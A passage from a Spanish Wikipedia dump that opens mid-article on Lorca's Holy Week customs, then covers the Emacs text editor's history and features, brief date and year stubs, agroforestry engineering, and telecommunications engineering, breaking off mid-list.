El primero de ellos, la Serenata a la Virgen de los Dolores, tiene lugar en la víspera del Viernes de Dolores, cuando a última hora de la misma, miles de azules se congregan en la puerta de la iglesia de San Francisco, sede de su Cofradía para felicitar a su manera a su Titular en la que habrá de ser, a las doce de la noche, su festividad.

También un acto característico de la Semana Santa lorquina tiene lugar cada tarde, en las vísperas de los desfiles bíblicos. Las banderas de los pasos se han colocado en determinados lugares del casco antiguo lorquino, donde la escuadra romana y un grupo de mayordomos, a los sones de los himnos de los pasos ("El Tres" en el caso de los blancos, "Las Caretas" en el de los azules) van a recogerlas acompañados de centenares de enfervorizados seguidores, que portan y agitan pañuelos con los colores de su paso.

El Martes Santo a las 23:00 en La Plaza de la Estrella del Barrio de San Cristóbal se produce el encuentro de imágenes de La Archicofradia del Stmo Cristo de la Sangre(Paso Encarnado) en la que de encuentran las Imágenes de La Stma Virgen de la soledad, Ntro Padre Jesús de la Penitencia y el titular de esta cofradía El Stmo Cristo de la Sangre.

El Miercoles Santo a las 22:15 en la Plaza de España se produce el tradicional encuentro de imágenes del Muy Ilustre Y Cavildo de Nuestra Señora la Stma Virgen de la Amagura(Paso Blanco) en la que se encuentran las imágenes de La Santa Mujer Verónica, San Juan Evangelista, y el Stmo Cristo del Rescate.

Por último, en la mañana del Viernes Santo el Paso Morado organiza un Vía Crucis, que se desarrolla siguiendo las antiguas oraciones que pronuncian los "rezaores".



Vídeo promocional de la Semana Santa en Lorca:


</doc>
<doc id="6403" url="https://es.wikipedia.org/wiki?curid=6403" title="Emacs">
Emacs

Emacs es un editor de texto con una gran cantidad de funciones, muy popular entre programadores y usuarios técnicos. GNU Emacs es parte del proyecto GNU y la versión más popular de Emacs con una gran actividad en su desarrollo. El manual de GNU Emacs lo describe como "un editor extensible, personalizable, auto-documentado y de tiempo real."

El EMACS original significa, Editor MACroS para el TECO. Fue escrito en 1975 por Richard Stallman junto con Guy Steele. Fue inspirado por las ideas de TECMAC y TMACS, un par de editores TECO-macro escritos por Guy Steele, Dave Moon, Richard Greenblatt, Charles Frankston, y otros. Se han lanzado muchas versiones de EMACS hasta el momento, pero actualmente hay dos que son usadas comúnmente: GNU Emacs, iniciado por Richard Stallman en 1984, y XEmacs, una fork de GNU Emacs, que fue iniciado en 1991. Ambos usan una extensión de lenguaje muy poderosa, Emacs Lisp, que permite manejar tareas distintas, desde escribir y compilar programas hasta navegar en Internet. GNU Emacs es mantenido por el Proyecto GNU Emacs, el cual cuenta entre sus miembros a Richard Stallman.

Algunas personas hacen distinción entre la palabra en mayúsculas "Emacs", usada para referirse a versiones derivadas del programa creado por Richard Stallman (particularmente GNU Emacs y XEmacs), y la palabra en minúsculas "emacs", que es usada para referirse al gran número de implementaciones de Emacs. La palabra "emacs" es pluralizada frecuentemente en inglés como emacsen por analogía con "oxen". Por ejemplo, el paquete compatible de Emacs para Debian se llama codice_1. El único plural proporcionado por el "Collins English Dictionary" es emacsen.

En la cultura de Unix, Emacs es uno de los dos principales contendientes en las tradicionales guerras de editores, el otro es vi.

Emacs nació en los laboratorios del MIT durante los años 70. Antes de su introducción, el editor de textos predeterminado en el Sistema Incompatible de Tiempo Compartido (ITS), el sistema operativo en los laboratorios de Inteligencia Artificial PDP-6 y PDP-10, era un editor de líneas conocido como TECO. A diferencia de los editores de texto modernos, en TECO la introducción de texto, la edición y la vista del mismo se hacía de manera separada, como Vi lo haría luego. Los caracteres tecleados no aparecían dentro del documento, había que introducir una serie de instrucciones, en el lenguaje de TECO, indicándole que debía colocar los caracteres requeridos. El texto no se mostraba en la pantalla. Este comportamiento es similar al del programa ed, que todavía se utiliza hoy en día.

Richard Stallman visitó el Laboratorio de Inteligencia Artificial de Stanford en 1972 o 1974 y conoció al editor de textos "E". Escrito por Fred Wright, el editor, tenía un comportamiento intuitivo WYSIWYG (lo que ves es lo que obtienes) como es común en los editores de textos modernos. Impresionado por esta característica, Stallman volvió al MIT donde Carl Mikkelsen, uno de los hackers en el Laboratorio de Inteligencia Artificial, había agregado un modo de edición-muestreo llamado "Control-R" a TECO, que le permitía a la pantalla mostrar lo que el usuario ingresaba desde el teclado. Stallman reimplementó este modo para que corriera eficientemente. Agregó una característica al modo edición-muestreo de TECO, para que el usuario pueda redefinir cualquier atajo de teclado para ejecutar un programa TECO.

Otra característica de E, que no tenía TECO, era corregir el acceso aleatorio. Desde la implementación, el TECO original fue un editor secuencial, diseñado para editar cinta de papel perforada en el PDP-1. La edición típica podía ser llevada a cabo en una página a la vez, en el orden que las páginas aparecen en el archivo. 

La nueva versión de TECO fue popular en el Laboratorio de IA, y pronto acumuló una colección de macros, cuyos nombres terminaban en "MAC" o "MACS". Dos años después, Guy Steele unificó una diversidad de macros de teclado en uno solo. 

Después de una noche de hacking conjunto por Steele y Stallman, éste acabó la implementación, que incluía utilidades para extender y documentar el nuevo conjunto de macros. El sistema resultante fue llamado EMACS, es decir, "Editing MACroS". Una versión alternativa sostiene que EMACS quería decir "E con MACroS", refiriéndose a la falta de capacidades de macros en E. Según Stallman, él tomó el nombre Emacs "porque <nowiki><E></nowiki> no estaba en uso como abreviatura en el ITS en aquel momento". Se ha comentado también que "Emack & Bolio's" era el nombre de una heladería popular en Boston, a poca distancia del MIT. Un programa de formateo de texto usado en ITS fue llamado más tarde BOLIO por Dave Moon, que frecuentaba la heladería. No obstante, a Stallman no le gustaba ese helado, y ni siquiera lo conocía cuando eligió el nombre "Emacs"; esta ignorancia es la base de un Hacker koan, "Emacs and Bolio").

Stallman se dio cuenta del peligro que entrañaba demasiadas personalizaciones del programa y las bifurcaciones "de facto" que podría llegar a suponer, y estableció ciertas condiciones para el uso del programa. Más tarde escribió:

El Emacs original, como el TECO, se ejecutaba únicamente en la familia de ordenadores PDP. Su comportamiento era suficientemente distinto de TECO como para ser considerado un editor de texto por derecho propio. Rápidamente se convirtió en el programa estándar de edición en ITS. También fue portado de ITS al Tenex y a sistemas operativos TOPS-20 por Michael McMahon, pero no a Unix inicialmente. Otros colaboradores en versiones tempranas de Emacs fueron Kent Pitman, Earl Killian y Eugene Ciccarelli.

Durante los siguientes años, se escribieron muchos editores similares a Emacs para otros sistemas operativos. Entre ellos SINE (Sine Is Not EMACS), EINE ("Eine Is Not EMACS") y ZWEI ("ZWEI Was EINE Initially", para la máquina Lisp), que fueron escritos por Michael McMahon y Daniel Weinreb (Los nombres EINE y ZWEI significan respectivamente "uno" y "dos" en alemán). En 1978, Bernard Greenberg escribió Multics Emacs en el Cambridge Information Systems Lab de Honeywell.

El primer editor similar a Emacs que funcionó sobre Unix fue el Gosling Emacs, escrito en 1981 por James Gosling (que más tarde inventó el lenguaje de programación Java). Fue escrito en el lenguaje de programación C y utilizaba un lenguaje de extensión conocido como Mocklisp, con sintaxis similar a la del lenguaje Lisp. En 1984 era software propietario.

En 1984, Stallman empezó a trabajar en GNU Emacs para producir una alternativa de software libre al Gosling Emacs. Inicialmente se basó en el Gosling Emacs, pero Stallman reemplazó el intérprete de Mocklisp con un intérprete de Lisp, lo que le obligó a sustituir casi todo el código. GNU Emacs se convirtió en el primer programa publicado por el emergente Proyecto GNU.

GNU Emacs está escrito en Emacs Lisp (a su vez implementado en C) como lenguaje de extensión. La primera versión ampliamente distribuida de GNU Emacs fue la 15.34, que apareció en 1985. Las versiones de la 2 a la 12 no existieron nunca. Las primeras versiones habían sido numeradas con la forma "1.x.x", pero antes de la versión 1.12 se decidió quitar el "1" inicial, ya que se pensaba que este número nunca cambiaría. La versión 13, la primera que fue pública, se liberó el 20 de marzo de 1985.

GNU Emacs se ejecutaba en Unix, al igual que Gosling Emacs. No obstante, GNU Emacs tenía más funciones, como por ejemplo, el Lisp (completo) como lenguaje de extensión. Como resultado, pronto reemplazó a Gosling Emacs como editor Emacs "de facto" sobre Unix.

Hasta 1999, el desarrollo de GNU Emacs fue relativamente cerrado, hasta el punto en que fue utilizado como ejemplo del modelo de desarrollo de "catedral" en "La catedral y el bazar". El proyecto ha adoptado desde entonces una lista de correo pública de desarrollo, y acceso anónimo al sistema CVS. El desarrollo tiene lugar en una única rama de CVS, que está actualmente en la versión 23.4.1. La persona encargada actualmente de su mantenimiento es Richard Stallman.

A partir de 1991, Jamie Zawinski y otros desarrollaron Lucid Emacs en Lucid Inc., basándose en una versión alfa de GNU Emacs 19. Las dos bases de código divergieron pronto, y los dos equipos de desarrollo desistieronde intentar combinarlas de nuevo en un solo programa. Este fue uno de los más famosos forks de un programa de software libre. Lucid Emacs ha sido renombrado como XEmacs. Éste y GNU Emacs son las dos variedades actuales en uso más populares. La "X" en XEmacs se deriva, bien de un enfoque inicial para soportar el sistema X Window como interfaz gráfica de usuario, o bien un "nombre de compromiso" entre las partes que desarrollaban XEmacs. Tanto GNU Emacs como XEmacs soportan interfaces gráficas y terminales de texto.

GNU Emacs fue inicialmente pensado para computadores con un espacio de direcciones de 32-bit, y al menos 1 MiB de RAM, en una época en la cual esos computadores eran considerados de alta calidad. Esto dejó una puerta abierta para pequeñas reimplementaciones. Algunas destacables se nombran a continuación:

Para GNU Emacs (y en general para los paquetes de software GNU), la política sigue consistiendo en aceptar contribuciones significativas de código sólo si el titular del copyright renuncia adecuadamente a sus derechos de copia. No obstante, se hizo una excepción a esta política para el código de MULE (MULtilingual Extension, extensión multilingüe que maneja Unicode y métodos más avanzados de tratar con otros lenguajes), ya que el titular del copyright es el gobierno japonés y la transferencia de copyright no era posible.

Esta política, sin embargo, no se aplica a contribuciones de código extremadamente pequeñas o corrección de fallos. No hay una definición estricta de "contribución pequeña", pero a modo de orientación, se considera que sería menos de 10 líneas de código.

Esta política está pensada para facilitar el refuerzo del copyleft, de manera que la FSF pueda defender el software en un juicio, si éste se produjera.

El resto de este artículo trata sobre las versiones modernas de Emacs, es decir, GNU Emacs y XEmacs, las únicas encarnaciones de Emacs que son ampliamente usadas hoy en día. El término "Emacs" se usará para referirse a ambos programas, ya que tienen características muy similares; XEmacs comenzó como un fork de GNU Emacs y sus versiones siguientes se han mantenido más o menos compatibles con GNU Emacs.

A pesar de (o quizás a causa de) su venerable pasado, Emacs es uno de los editores de texto más potentes y versátiles hoy en día. Debe remarcarse que es principalmente un editor de "texto", y no un procesador de texto; su enorme conjunto de características está orientado a ayudar el usuario a manipular trozos de texto, más que manipular el tipo de letra de los caracteres o imprimir documentos (aunque Emacs puede también hacer eso). Emacs tiene una gran cantidad de características que permiten lidiar con la aparentemente sencilla tarea de editar texto, que van desde comandos para manipular palabras y párrafos (borrarlos, moverlos, moverse por entre ellos, etc.), hasta resaltado de sintaxis para hacer el código fuente más fácil de leer, o ejecutar "macros de teclado" que contienen lotes de comandos de edición definidos por el usuario.

La rica variedad de características que se encuentran en Emacs es el resultado de su diseño poco habitual. Casi toda la funcionalidad del editor, desde las operaciones básicas de edición (como la inserción de caracteres en un documento) hasta la configuración de la interfaz de usuario, es controlada por un dialecto del lenguaje de programación Lisp. En este entorno Lisp, variables e incluso funciones enteras pueden ser modificadas al vuelo, sin tener que recompilar o ni siquiera reiniciar el editor. Como resultado, el comportamiento de Emacs puede ser modificado casi sin límite, bien directamente por el usuario, o (más habitualmente) cargando fragmentos de código Emacs Lisp. Estos fragmentos son conocidos como "bibliotecas", "librerías", "paquetes" o "extensiones".

Emacs contiene un gran número de bibliotecas escritas en Emacs Lisp, y en Internet se pueden encontrar más bibliotecas de terceras partes. Muchas bibliotecas implementan ayudas para la programación de ordenadores, lo que es un reflejo de la popularidad de Emacs entre los programadores. Emacs se puede usar como un entorno de desarrollo integrado (IDE), que permite a los programadores editar, compilar y depurar su código con una única interfaz. Otras bibliotecas realizan funciones menos habituales. A continuación se enumeran varios ejemplos:


El problema del diseño de Emacs, basado en Lisp, es una penalización de rendimiento resultante del hecho de cargar e interpretar el código Lisp. En los sistemas donde fue implementado en primer lugar, Emacs era a menudo mucho más lento que otros editores de texto. Algunos acrónimos bromistas aluden a este hecho: "Eight Megabytes And Constantly Swapping" (de los días en que ocho megabytes era mucha memoria), "Emacs Makes A Computer Slow", "Eventually Mallocs All Computer Storage", y "Eventually Makes All Computers Sick". No obstante, los ordenadores modernos son suficientemente rápidos, de manera que Emacs raramente se nota lento. De hecho, Emacs se inicia más rápidamente que la mayoría de procesadores de texto modernos. Otros acrónimos de broma describen la interfaz de usuario: "Escape Meta Alt Control Shift".

Emacs es uno de los programas de ordenador no triviales más portados a otras plataformas. Se ejecuta en una amplia variedad de sistemas operativos, entre ellos los sistemas de tipo Unix (GNU/Linux, BSD, Solaris, AIX, IRIX), Mac OS X,

Emacs se ejecuta tanto en entornos de terminal de texto como en entornos de interfaz gráfica de usuario ("GUI"). Emacs utiliza el Sistema de ventanas X para generar su GUI, ya sea directamente, o bien usando un "widget toolkit" como Motif, LessTif o GTK+. Emacs puede usar también los sistemas gráficos nativos de Mac OS X (utilizando la API Carbon) y de Microsoft Windows. La interfaz gráfica proporciona barras de menú, barras de herramientas, barras de scroll y menús contextuales.

Emacs adapta su comportamiento al tipo de texto que está editando mediante modos de edición llamados "modos mayores" ("major modes"). Los modos mayores se definen para textos de texto ordinario, código fuente para diversos lenguajes de programación, documentos HTML, TeX y LaTeX y muchos otros tipos de texto. Cada modo mayor modifica ciertas variables en Lisp para que Emacs se comporte de forma más conveniente para ese tipo concreto de texto. Habitualmente, definen las tablas para resaltado de sintaxis, usando distintos tipos de letra o colores para mostrar las palabras clave, comentarios, etc. Los modos mayores también ofrecen comandos especiales de edición. Por ejemplo, los modos mayores para lenguajes de programación definen habitualmente comandos para saltar al principio o al final de una función.

El comportamiento de Emacs puede ser más personalizado aún utilizando los "modos menores" ("minor modes"). Mientras que sólo se puede asociar un modo mayor con un buffer a la vez, se puede tener activos varios modos menores. Por ejemplo, el modo mayor para el lenguaje de programación C define un modo menor diferente para cada uno de los estilos de indentación más populares.

Muchos usuarios de Emacs personalizan el editor para adaptarlo a sus necesidades. Hay tres formas principales de personalizar Emacs. La primera es la extensión "customize", que permite que el usuario asigne valores a variables comunes de personalización, como el esquema de color, usando una interfaz gráfica. Esto está orientado a principiantes en Emacs que no quieren trabajar con código en Emacs Lisp.

La segunda forma es registrar pulsaciones de teclados en macros y reproducirlas para automatizar tareas complejas y repetitivas. Esto se suele hacer de forma ad-hoc, descartando cada macro tras su uso, aunque las macros pueden ser guardadas e invocadas cuando se necesiten. 

El tercer método para personalizar Emacs es usar Emacs Lisp. Habitualmente, el código Emacs Lisp proporcionado por el usuario se guarda en un fichero llamado codice_2, que se carga cuando Emacs comienza. El fichero codice_2 se usa con frecuencia para asignar a variables y atajos de teclado valores distintos de la configuración por defecto, y para definir nuevos comandos para el usuario. Muchos usuarios avanzados tienen ficheros codice_2 de ciento de líneas, con personalizaciones que hacen que Emacs funcione de forma muy diferente del comportamiento por defecto.

Si un fragmento de código Emacs Lisp es útil en general, a menudo se empaqueta en forma de biblioteca y se distribuye a otros usuarios. Muchas bibliotecas de terceras partes se pueden encontrar en Internet. Por ejemplo, una biblioteca llamada para editar artículos de Wikipedia. Hay incluso un grupo de noticias de Usenet, , usado para enviar nuevas bibliotecas. Algunas bibliotecas externas pueden convertirse en una biblioteca "estándar" de Emacs.

El primer Emacs incluía una potente biblioteca de "ayuda" que podía mostrar la documentación para cada comando, variable y función interna (es posible que haya originado esta técnica) A causa de esto, Emacs fue calificado de "programa autodocumentado". Este término no significa que Emacs escriba su propia documentación, sino que presenta su propia documentación al usuario. Esta característica hace que la documentación de Emacs sea muy accesible. Por ejemplo, el usuario puede averiguar qué comando está asociado a una combinación de teclas introduciendo simplemente codice_5 (que invoca al comando codice_6), seguido de la combinación de teclas. Cada función incluía una cadena de documentación, pensada específicamente para ser mostrada al usuario en caso que éste lo pidiera. Esta práctica se extendió posteriormente a varios lenguajes de programación, como Lisp y Java.

El sistema de ayuda de Emacs es útil no sólo para principiantes, sino también para usuarios avanzados que escriban código en Emacs Lisp. Si la documentación para una función o variable no es suficiente, el sistema de ayuda puede ser utilizado para navegar entre el código fuente de Emacs Lisp, tanto para bibliotecas predefinidas como para bibliotecas externas instaladas. Por tanto, es muy conveniente programar en Emacs Lisp usando el mismo Emacs.

Además de la documentación incluida en el programa, Emacs tiene un manual especialmente largo, detallado y bien escrito. Una copia electrónica del "Manual de GNU Emacs", escrita por Richard Stallman, se incluye con GNU Emacs y se puede ver con el navegador de Info predeterminado. XEmacs tiene un manual parecido, que se bifurcó del Manual de GNU Emacs al mismo tiempo que el programa XEmacs. Otros dos manuales, el "Emacs Lisp Reference Manual" (Manual de Referencia de Emacs Lisp), por Bill Lewis, Richard Stallman y Dan Laliberte, y "Programming in Emacs Lisp" (Programando en Emacs Lisp) por Robert Chassell, se incluyen también. Además de las versiones electrónicas, los tres manuales están disponibles en forma de libro, publicado por la Free Software Foundation.

Emacs también tiene un tutorial. Cuando Emacs se inicia sin especificar ningún fichero para editar, muestra instrucciones para ejecutar comandos simples de edición y para invocar el tutorial.

Emacs soporta la edición de texto escrito en muchos lenguajes humanos. Hay soporte para muchos alfabetos, guiones, sistemas de escritura y convenciones culturales. Emacs proporciona revisión ortográfica para muchos lenguajes mediante la llamada a programas externos como ispell. Muchos sistemas de codificación están soportados, como por ejemplo UTF-8. La versión 21.5 de XEmacs tiene soporte parcial para Unicode. La versión 21.4 de GNU Emacs tiene un soporte similar. Emacs 22 tendrá mejor soporte. Todos estos esfuerzos para soportar Unicode utilizan una codificación interna específica de Emacs, con lo cual se necesita una conversión para cargar y guardar. UTF-8 será el sistema de codificación interna de Emacs en una versión futura de XEmacs 21.5, y seguramente en GNU Emacs 23.

No obstante, la interfaz de usuario de Emacs está en inglés y no ha sido traducida a otros idiomas, con la excepción del tutorial para principiantes. De modo no oficial, existen varios proyectos de traducción de la documentación de GNU Emacs, así como un proyecto de internacionalización y localización completas de GNU Emacs al español (véanse los enlaces).

Para usuarios con deficiencias visuales, hay un subsistema llamado "Emacspeak" que permite que el editor sea usado únicamente mediante una interfaz de audio.

El código fuente del programa, que incluye tanto los componentes en lenguaje C como en Emacs Lisp, está disponible libremente para su examen, modificación y redistribución, bajo los términos de la Licencia pública general de GNU (GNU GPL). Las versiones más antiguas de la documentación de GNU Emacs fueron liberadas bajo una licencia ad-hoc que requería la inclusión de ciertos textos en cualquier copia modificada. En el manual de usuario de GNU Emacs, por ejemplo, esto incluía la forma de obtener GNU Emacs y el ensayo político de Richard Stallman, "El Manifesto de GNU". Los manuales de XEmacs, que fueron heredados de los antiguos manuales de GNU Emacs cuando el fork tuvo lugar, tienen la misma licencia. En cambio, las versiones más modernas de la documentación de GNU Emacs usan la licencia GFDL y usan "secciones invariantes" para requerir la inclusión de los mismos documentos, y también que los manuales se autoproclamen como "Manuales GNU".

Desde el shell de Unix, un fichero se puede abrir para ser editado escribiendo "emacs [nombre del fichero]". Si el fichero cuyo nombre se ha introducido no existe, se creará un nuevo fichero con este nombre. Por ejemplo, escribiendo "emacs xorg.conf" se editará el fichero xorg.conf en el directorio actual, si existe. No obstante, la documentación de Emacs recomienda iniciar el programa sin introducir un nombre de fichero, para evitar el mal hábito de iniciar un proceso separado para cada fichero a editar. La manera de sacarle partido completamente a Emacs es abrir todos los ficheros desde una única instancia del programa.

En el modo de edición normal, Emacs se comporta como otros editores de texto: Las teclas de caracteres ("a", "b", "c", "1", "2", "3", etc.) sirven para insertar los caracteres correspondientes, las teclas de flecha mueven el punto de edición, la tecla backspace borra texto, etc. Otros comandos pueden ser invocados mediante teclas modificadoras, presionando Control o Meta (equivalente a la actual tecla Alt) o ambas, junto con otra tecla. Cada comando de edición es en realidad una llamada a una función en el entorno de Emacs Lisp. Incluso un comando tan simple como escribir codice_7 para insertar el carácter "a" implica una llamada a una función. En este caso, la función sería codice_8.

Más abajo se muestran algunos de los comandos básicos. Se pueden encontrar más en la lista de comandos de Emacs. La tecla de control se representa con una "C" mayúscula y la tecla de alternativa (Alt) o meta se representa con una "M" mayúscula.

Los comandos codice_9 y codice_10 usan el presionado de teclas "múltiple". Por ejemplo, codice_11 significa: mientras se mantiene presionada la tecla "control", presionar "x"; mientras se mantiene presionada la tecla "control", presionar "c". Esta técnica, permite tener más comandos para el teclado, que cuando se utiliza el presionado simple de teclas, esta metodología fue popularizado por Emacs, proveniente desde TECMAC, una de las colecciones macro de TECO, predecesor de Emacs. Desde entonces ha sido una característica, inclusive hasta en redactores modernos de código como Visual Studio.

Cuando Emacs está ejecutando una interfaz gráfica, muchos comandos se pueden invocar desde el menú principal o la barra de herramientas en vez de utilizar el teclado. Sin embargo, muchos usuarios experimentados de Emacs prefieren utilizar el teclado porque es más rápido y conveniente una vez que las secuencias de teclas se han memorizado.

Algunos comandos Emacs trabajan mediante la invocación de programas externos (tal como ispell para la comprobación de ortografía o gcc para la compilación de programas), analizando la salida del programa, y mostrando el resultado en Emacs.

El "minibuffer", normalmente la línea inferior de la pantalla, es el espacio en el que Emacs pide información. En el minibuffer se puede introducir el texto que se debe encontrar en una búsqueda, el nombre de un fichero para leer o guardar e información similar. Cuando es aplicable, es posible utilizar el completado mediante la tecla del tabulador ("tab completion").

Emacs mantiene texto en objetos denominados "buffers". El usuario puede crear nuevos buffers y destruir los indeseados, y pueden existir al mismo tiempo varios buffers. La mayoría de los buffers contienen información cargada desde archivos de texto binarios, que el usuario puede editar y guardar de nuevo a disco. Los buffers se usan también para almacenar texto temporal, como las cadenas de documentación mostradas por la biblioteca "help".

Tanto en modo de terminal de texto como en modo gráfico, Emacs es capaz de dividir el área de edición en secciones separadas (a las cuales se refiere como "ventanas" desde el año 1975, lo cual puede resultar confuso en sistemas con otro concepto de "ventana"), de forma que más de un buffer pueda ser mostrado a la vez. Esto tiene muchos posibles usos. Por ejemplo, una sección puede ser utilizada para mostrar el código fuente de un programa, mientras que otra muestra los resultados de compilar ese programa. En entornos gráficos, Emacs puede lanzar también múltiples ventanas gráficas, conocidas como "marcos" ("frames") en la terminología propia de Emacs.

Debido a que Emacs requiere un uso frecuente de las teclas modificadoras (y en particular, de la tecla Control, la cual normalmente se pulsa con el meñique), muchos usuarios asiduos de Emacs sufren lesiones por esfuerzo repetitivo, las cuales se manifiestan como molestias y dolor en los dedos meñiques. Este problema es tan frecuente que ha llegado a conocerse entre la comunidad de usuarios como "el meñique de Emacs".

Una solución común consiste en intercambiar las funciones de las teclas Control y Caps Lock en la parte izquierda del teclado, o definir ambas teclas como Control. También existen teclados especiales (Kinesis Contoured Keyboard) que colocan las teclas modificadoras en una posición en la que pueden ser fácilmente pulsadas con el pulgar, o con teclas modificadoras de gran tamaño en una posición en la que se puedan pulsar con la palma de la mano (Microsoft Natural Keyboard).

La "Iglesia de Emacs" formada por Richard Stallman es una parodia sobre una religión para los usuarios de Emacs. En esa se refiere a Vi como el "editor de la bestia" (vi-vi-vi que seria 6-6-6 en numeración romana) pero esto no quiere decir que se esté en contra del uso de Vi (se dice que usar una versión libre de vi es solo una penitencia).

Stallman, también, encarna a un santo de la iglesia de Emacs que tiene el nombre de San Ignucio, el cual usa un antiguo disco duro como aureola.





</doc>
<doc id="6404" url="https://es.wikipedia.org/wiki?curid=6404" title="19 de abril">
19 de abril

El 19 de abril es el 109.º (centésimo noveno) día del año en el calendario gregoriano y el 110.º en los años bisiestos. Quedan 256 días para finalizar el año.













</doc>
<doc id="6407" url="https://es.wikipedia.org/wiki?curid=6407" title="20 de abril">
20 de abril

El 20 de abril es el 110.º (centésimo décimo) día del año en el calendario gregoriano y el 111.º en los años bisiestos. Quedan 255 días para finalizar el año.








</doc>
<doc id="6408" url="https://es.wikipedia.org/wiki?curid=6408" title="1921">
1921

1921 (MCMXXI) fue un Año normal comenzado en sábado según el calendario gregoriano.

























</doc>
<doc id="6410" url="https://es.wikipedia.org/wiki?curid=6410" title="Ingeniería agroforestal">
Ingeniería agroforestal

La ingeniería agroforestal es una rama de las ciencias agropecuarias que se encarga del conocimiento de los recursos naturales y los agroecosistemas, especialmente de las relaciones que se establecen cuando se combinan árboles, cultivos y animales-pastos en la misma unidad de terreno manteniendo los principios de sustenibilidad, productividad y adaptabilidad.

También es considerada como el sistema de uso de la tierra donde interactúan componentes animales, silvicolas y pecuarios la combinación de estos puede ser de forma secuencial o simultánea de manera que el aprovechamiento de los componentes sea en tiempo (mediano, corto y largo plazo) y espacio (terreno).



</doc>
<doc id="6411" url="https://es.wikipedia.org/wiki?curid=6411" title="Ingeniería de telecomunicaciones">
Ingeniería de telecomunicaciones

La ingeniería de telecomunicación (o de telecomunicaciones) es una rama de la ingeniería, que resuelve problemas de transmisión y recepción de señales e interconexión de redes. Es la disciplina de aplicación de la telecomunicación, término que se refiere a la comunicación a distancia, generalmente a través de la propagación de ondas electromagnéticas y ópticas. Esto incluye muchas tecnologías, como radio, televisión, teléfono, comunicaciones de datos y redes informáticas como Internet. La definición dada por la Unión Internacional de Telecomunicaciones (ITU, International Telecommunication Union) para telecomunicación es toda emisión, transmisión y recepción de signos, señales, escritos e imágenes, sonidos e informaciones de cualquier naturaleza, por hilo, radioelectricidad, medios ópticos u otros sistemas electromagnéticos.

Un sistema de telecomunicaciones está compuesto por el emisor de información, el canal de transmisión y el receptor de la información. El emisor es un dispositivo que transforma o codifica el mensaje en un fenómeno físico: la señal. El canal o medio transmite dicha señal, y el receptor hace el proceso inverso al emisor para obtener la información.

Las funciones del emisor siempre implican de uno u otro modo la codificación de la información y su adaptación al canal. El canal de transmisión, por razones físicas, modifica o degrada de algún modo la señal en su trayecto. El receptor ha de realizar las funciones de detectar la señal, recomponerla y decodificarla con el fin de extraer la información. En este proceso siempre existe una posibilidad de error, que la ingeniería de telecomunicación trata de minimizar.

A modo de ejemplo familiar de un sistema de telecomunicación podemos considerar la comunicación vocal entre personas. Este caso podemos descomponerlo así:

En otros casos, a modo de ejemplo, la comunicación se puede realizar entre faxes, teléfonos, teclado-impresora, cámara-pantalla... y el canal de comunicación puede estar compuesto por hilos, ondas de radio, fibra óptica, satélite...

Según el sentido de la transmisión podemos clasificar la comunicación en unidireccional (del emisor al receptor) u bidireccional (comunicación en ambos sentidos).

La topología de una telecomunicación puede ser punto a punto y punto a multipunto (llamada difusión en el caso extremo con muchos receptores y con transmisión unidireccional).

El problema intrínseco de la comunicación se presenta cuando queremos transmitir información de manera rápida o entre dos puntos lejanos, o ambas cosas a la vez. Ese es el caso que ha hecho desarrollar la ingeniería de telecomunicación.

Una definición general que permite aproximarse al perfil de un Ingeniero concibe al mismo como el profesional que, con una sólida base en ciencias básicas, puede integrar y proyectar los principios de la ingeniería para plantear soluciones a problemas del ámbito tecnológico usando como herramientas la formulación de modelos matemáticos, el diseño y el cálculo.

En particular, el Ingeniero de Telecomunicación puede definirse como un profesional cuya formación lo faculta para planificar, proyectar, diseñar y calcular sistemas, redes y servicios de generación, transmisión, detección, manejo y gestión de teleinformación. Incluye también una sólida formación en las áreas de la administración y economía que lo habilitan para dirigir, organizar y explotar servicios de telecomunicaciones y para ejecutar, supervisar y evaluar proyectos relacionados con el área.




Se utiliza todos los medios disponibles, cobre, fibra óptica, radios y satélites, logrando redes escalables y racionalizando las inversiones de infraestructura.

En los tres últimos años, las redes que más crecieron en capilaridad y capacidad de transporte son las redes de telefonía celular y de transporte de Internet, las que utilizan todos las tecnologías antes citadas. Creando una revolución en las comunicaciones entre personas e instituciones como jamás ha disfrutado la humanidad, permitiendo una globalización y democratización de la cultura.

Otro aspecto de las telecomunicaciones es la progresiva informatización de la actividad humana, posibilitando el crecimiento de las demás ramas del saber y actividad humanas. Si bien todavía tenemos casos donde muchos países no pueden desplegarse redes de comunicaciones y otros donde se ejerce la censura, el futuro es prometedor.

Los sistemas de comunicaciones están diseñados para comunicarse a través de órganos sensoriales humanos (principalmente los de Percepción visual y Percepción sonora), en los cuales se tiene en cuenta las características psicológicas y fisiológicas de la percepción humana, el ejemplo más común que podemos citar el sonido de campanilla que escuchamos cuando llamamos por teléfono, si bien técnicamente no es necesario si lo necesita la persona que espera ser atendida. Por otra parte los sistemas se diseñan utilizando la capacidad de nuestros órganos sensoriales de integrar la información, como ejemplo la transmisión de televisión que utiliza la remanencia visual de los ojos para transmitir menos información, abaratando el costo de los receptores y transmisores. Lo mismo sucede con la telefonía celular y la comunicación por VoIP utilizando internet como vínculo de bajo costo.

Actualmente en países cuyos habitantes poseen un mayor poder adquisitivo, ante ciertos tipos de defectos, a pesar de ser objetivamente razonables en función del costo beneficio, reclaman a los operadores una ma Ancha en servicios de internet, mayor calidad y sofisticación de telefonía celular como 3G, equipos de interfaz más sofisticados con más y mejores funciones, un ejemplo son los teléfonos celulares que hoy pueden incluir: captura de video, cámara fotográfica, variedad de tonos de alerta, vibrador, "trunking", grabador de voz, internet por WiMax, agenda y capacidad de realizar pagos como una tarjeta de crédito.

De todos modos existe un compromiso entre reducción de costes y las demandas de los usuarios de sistemas de gran calidad, lo que consiste una importante consideración de cara al diseño de estos sistemas por parte de los grandes operadores de telecomunicaciones que deberán seguir indefectiblemente las regulaciones de los distintos gobiernos y de los organismos internacionales como La ITU.

En España, actualmente, el estudio de la ingeniería de Telecomunicación está descompuesto en cuatro itinerarios, que estudian todas las áreas de conocimiento:

El grado con itinerario en sistemas de telecomunicación estudia la planificación, desarrollo y gestión de proyectos para el diseño, concepción, despliegue, supervisión y explotación de:

- Redes, servicios y aplicaciones de telecomunicaciones.

- Sistemas de transmisión (cable y fibra óptica, incluidos medios y equipos de comunicación)

- Sistemas de comunicación radio (radiodifusión, redes inalámbricas, sistemas de satélites, sistemas móviles, radar y radiodeterminación)

- Circuitos RF y microondas (antenas y sistemas radiantes), además de técnicas de información y procesamiento de señales.

El grado con itinerario en sistemas electrónicos estudia:

- La planificación, desarrollo y gestión de proyectos para el diseño, concepción, despliegue y explotación de redes, servicios y aplicaciones de 
telecomunicaciones

